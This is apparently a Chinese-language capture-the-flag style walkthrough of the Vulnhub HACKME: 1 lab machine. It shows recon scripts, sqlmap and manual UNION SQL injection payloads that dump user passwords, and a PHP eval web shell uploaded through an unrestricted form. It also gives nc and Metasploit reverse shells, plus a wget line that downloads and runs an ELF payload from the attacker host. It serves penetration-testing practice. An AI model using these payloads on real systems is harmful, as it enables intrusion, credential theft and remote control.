# (Vulnhub练习)-- HACKME: 1渗透实战





## 下载地址

````
https://www.vulnhub.com/entry/hackme-1,330/
````

## 扫描主机

```
netdiscover -i eth0 -r 192.168.100.0/24
```

## 目标主机IP：192.168.100.134

## 信息收集

>  信息收集的步骤基本上差不多,可根据工具简单写个shell脚本

```sh
#!/usr/bin/bash

ip=192.168.100.$1

ping -c2 $ip &>/dev/null  
if [ $? -eq 0 ] ; then 
		echo "$ip is up"
	else 
			echo "$ip is down"
			    exit
fi

masscan --rate=10000 --ports 0-65535 $ip 
masscan --rate=10000 --ports 0-65535 $ip 
nmap -A $ip
sleep 30
whatweb $ip 
sleep 10
dirsearch  -u  $ip 
sleep 5
nikto -h $ip 
sleep 5
dirb http://$ip 
```

> 我的网段在192.168.100.0/24  所以**ip**要改改

```
 /home/xiaoxiaoran/shell/xinxi.sh 134
```

### nmap端口扫描

![image-20211206183809989](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202112061838113.png)

### 指纹识别

![image-20211206183858248](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202112061838297.png)

### 路径扫描

![image-20211206183827214](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202112061838262.png)

## 开始测试

### SQL注入

登录主页发现登录页面，而且还可以注册用户

注册用户admin 密码123456 登录admin用户

### sqlmap自动化执行

```
sqlmap -u http://192.168.100.134/welcome.php --cookie "PHPSESSID=u5eefssue2adhtmid1rnnpj3ui" --forms --batch
sqlmap -u http://192.168.100.134/welcome.php --cookie "PHPSESSID=u5eefssue2adhtmid1rnnpj3ui" --forms --batch --current-db
sqlmap -u http://192.168.100.134/welcome.php --cookie "PHPSESSID=u5eefssue2adhtmid1rnnpj3ui" --forms --batch --current-db -D webapphacking --tables
sqlmap -u http://192.168.100.134/welcome.php --cookie "PHPSESSID=u5eefssue2adhtmid1rnnpj3ui" --forms --batch --current-db -D webapphacking -T users --columns
sqlmap -u http://192.168.100.134/welcome.php --cookie "PHPSESSID=u5eefssue2adhtmid1rnnpj3ui" --forms --current-db -D webapphacking -T users -C user,name,pasword --dump
         
```

![image-20211206185414541](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202112061854600.png)



## 手工注入

```
//验证sql注入
Windows OS' and 1=1#

//验证sql注入
Windows OS' and 1=2# 

//判断字段数
Windows OS' order by 3#

//判断字段数
Windows OS' order by 4#

//判断显示位置
-1' union select 1,2,3#

//查看当前数据库
-1' union select database(),2,3#

//查看webapphacking库所有的表
-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='webapphacking'#

//查看users表中所有的列
-1' union select group_concat(column_name),2,3 from information_schema.columns where table_name='users'#

//查看表中user,password
-1' union select group_concat(user),group_concat(pasword),3 from users#

```

![image-20211206185948574](https://xiuxiu-1306082599.cos.ap-beijing.myqcloud.com/xiao/202112061859628.png)



## superadmin用户登录



superadmin		Uncrackable

### 文件上传漏洞

> 没有任何限制



```
<?php @eval($_POST[1]);
```



























nc反弹shell

### 代码

````php+HTML
<p>flag</p>
<?php system("nc -e /bin/bash 192.168.100.143 1234");?>
````

```
nc -nvlp 1234
```

### 效果



## msf php反弹shell

- msfvenom生成木马

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=8080
```

**php.rc文件**

```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 8080
exploit
```

- 开启监听

```sh
 msfconsole  -qr /home/xiaoxiaoran/shell/php.rc       
```

- 把生成的文件复制




## msf linux反弹shell

- msfvenom生成木马

```
msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.100.143 LPORT=4444 -b "\x00" -i 10 -f elf -o  /var/www/html/xiao3
```

**linux.rc文件**

```sh
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.100.143
set LPORT 4444
exploit
```

- 开启监听

```sh
msfconsole  -qr /home/xiaoxiaoran/shell/linux.rc  
```

- 改php代码



```
<p>flag</p>
<?php system("wget 192.168.100.143/xiao3 -O /tmp/xiao3;cd /tmp;chmod +x xiao3;./xiao3 &")?>
```

- 效果



##  提权